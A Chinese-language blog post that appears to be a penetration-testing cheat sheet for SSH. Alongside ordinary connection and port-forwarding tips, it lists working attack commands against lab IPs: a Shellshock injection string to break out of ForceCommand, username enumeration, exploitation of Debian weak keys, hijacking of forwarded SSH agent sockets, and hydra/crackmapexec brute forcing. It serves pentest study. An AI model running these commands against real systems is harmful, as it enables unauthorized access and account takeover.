---
title: SSH(22)渗透利用思路
date: 2026-01-17
slug: ssh-22-pentest-guide
tags: [SSH, Pentest, 渗透测试]
---

### 常规连接
```
ssh username@192.168.1.2
```
<!-- truncate -->
### 通过私钥连接
```
ssh-keygen -t ed25519 -C "备注内容"   #生成密钥对
sudo ssh -i id_ed25519 smbuser@192.168.2.129 #私钥连接
```
### 防止ssh连接断开
```
ssh -o ServerAliveInterval=60 user@host
```
每 60 秒自动发一个心跳包，维持连接。
### 常见连接报错
出现
~~~
┌──(kali㉿kali)-[~] 
└─$ ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 dstevens@192.168.2.129 Unable to negotiate with 192.168.2.129 port 22: no matching host key type found. Their offer: ssh-rsa,ssh-dss
~~~

通常是我们的ssh版本过高，服务端版本过低，更改进入时的配置即可生效
~~~
ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 -oHostKeyAlgorithms=+ssh-rsa,ssh-dss dstevens@192.168.2.129
~~~
- `-oKexAlgorithms=+diffie-hellman-group1-sha1`: 允许使用`diffie-hellman-group1-sha1`密钥交换算法。
- `-oHostKeyAlgorithms=+ssh-rsa,ssh-dss`: 允许使用`ssh-rsa`和`ssh-dss` host key类型。

出现`Permissions 0777 for 'id_ed25519' are too open.`
私钥权限过大（如777）,改为600即可
### 专项漏洞
#### Shellshock传参(CVE-2014-6271)
当 SSH 配置了强制执行命令（ForceCommand）时，如果系统 Bash 版本存在漏洞，攻击者可以通过环境变量注入恶意的 Bash 函数，从而绕过原本的命令限制，获取完整的 Shell。
如果可以传参，为什么不试试呢
~~~
ssh john@192.168.56.101 /bin/bash
~~~
~~~
ssh -i noob noob@10.0.2.30 '() { :;}; /bin/bash'
~~~
#### SSH用户名枚举漏洞（CVE-2018-15473)
```
python ssh_enum.py <目标IP地址> -U <用户名列表>
```
#### #### **OpenSSL随机数生成缺陷（CVE-2008-0166）**
```
git clone https://github.com/g0tmi1k/debian-ssh.git 
cd debian-ssh 
./find_key.py <目标IP地址> <用户账号>
```
### ssh端口转发
#### 本地转发(L)
将远程服务器的某个端口映射到本地。
_场景：_ 目标内网有一台数据库（3306），只有 SSH 机器能访问，你想在本地用图形化工具连接。
```
ssh -L 3306:127.0.0.1:3306 user@192.168.2.129
```
#### 远程转发(R)
将本地端口映射到远程服务器。
_场景：_ 你在内网，没有公网 IP，想让公网的 VPS 访问你的本地服务。
```
ssh -R 8080:127.0.0.1:80 user@vps_ip
```
#### 动态转发(D)
建立 SOCKS5 代理。所有经过本地1080端口的流量都被转发到vps
```
ssh -D 1080 user@192.168.2.129
```

### 会话劫持
#### 劫持SSH Agent Socket
当用户使用SSH Agent并开启了“转发”（`-A` 参数）连接到一台跳板机时，用户的本地私钥能力会通过一个Unix Domain Socket文件临时映射到跳板机上。
这个Socket文件通常存放在跳板机的/tmp目录下。如果跳板机上的root用户是攻击者，或者攻击者拥有读取该目录的权限，他们就可以直接“借用”这个用户的身份登录内网的其他机器
```
ls -al /tmp/ssh-*
export SSH_AUTH_SOCK=/tmp/ssh-XXXXXX/agent.XXXX
ssh user@内网其他机器
```
### ssh爆破
#### crackmapexec
~~~
sudo crackmapexec ssh  192.168.2.137 -u user.lst -p pass.lst
~~~
![[Pasted image 20240731144354.png]]
#### hydra
```
hydra -L user.txt -P pass.txt ssh://192.168.2.137 -t 4 -V
```